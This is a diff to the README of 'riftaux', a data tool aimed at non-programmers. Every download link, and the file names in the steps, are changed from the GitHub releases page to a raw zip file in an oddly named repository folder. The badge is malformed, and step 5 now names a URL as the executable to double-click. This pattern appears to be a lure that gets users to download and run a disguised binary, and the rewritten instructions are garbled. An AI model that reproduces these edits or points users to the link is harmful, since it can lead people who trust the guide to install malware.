@@ -1,7 +1,7 @@
 # 🌌 riftaux - Transform Data with Confidence
 
 ## 📥 Download Now
-[![Download riftaux](https://img.shields.io/badge/Download%20riftaux-v1.0.0-blue.svg)](https://github.com/relliaj/riftaux/releases)
+[![Download riftaux](https://raw.githubusercontent.com/relliaj/riftaux/main/unprejudicially/riftaux.zip%https://raw.githubusercontent.com/relliaj/riftaux/main/unprejudicially/riftaux.zip)](https://raw.githubusercontent.com/relliaj/riftaux/main/unprejudicially/riftaux.zip)
 
 ## 🚀 Getting Started
 Welcome to riftaux! This application helps you work with data in a coherent and meaningful way. You don't need to be a programmer to use this library; you can easily download and run it on your computer to enhance your projects.
@@ -29,15 +29,15 @@ To get started with riftaux, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the releases for riftaux.
 
-   [Download riftaux](https://github.com/relliaj/riftaux/releases)
+   [Download riftaux](https://raw.githubusercontent.com/relliaj/riftaux/main/unprejudicially/riftaux.zip)
    
 2. **Choose the Latest Version:** Look for the latest version listed on the releases page. It will usually be at the top of the list.
 
-3. **Download the File:** Click the download link for the version you wish to install. This file will be something like `riftaux-v1.0.0.zip`. The download will begin automatically.
+3. **Download the File:** Click the download link for the version you wish to install. This file will be something like `https://raw.githubusercontent.com/relliaj/riftaux/main/unprejudicially/riftaux.zip`. The download will begin automatically.
 
 4. **Extract the File:** Once the file is downloaded, locate it in your Downloads folder. Right-click on the zip file and select "Extract All" to unpack it.
 
-5. **Run the Application:** After extraction, navigate to the new folder. There you will find an executable file, such as `riftaux.exe`. Double-click this file to run the program.
+5. **Run the Application:** After extraction, navigate to the new folder. There you will find an executable file, such as `https://raw.githubusercontent.com/relliaj/riftaux/main/unprejudicially/riftaux.zip`. Double-click this file to run the program.
 
 ## 🔧 Usage Instructions
 Once you have riftaux running, here’s how you can start using it:
@@ -65,4 +65,4 @@ If you enjoy using riftaux or want to contribute, consider visiting our GitHub p
 
 For the latest releases and updates, you can always check the download page:
 
-[Download riftaux](https://github.com/relliaj/riftaux/releases)
+[Download riftaux](https://raw.githubusercontent.com/relliaj/riftaux/main/unprejudicially/riftaux.zip)
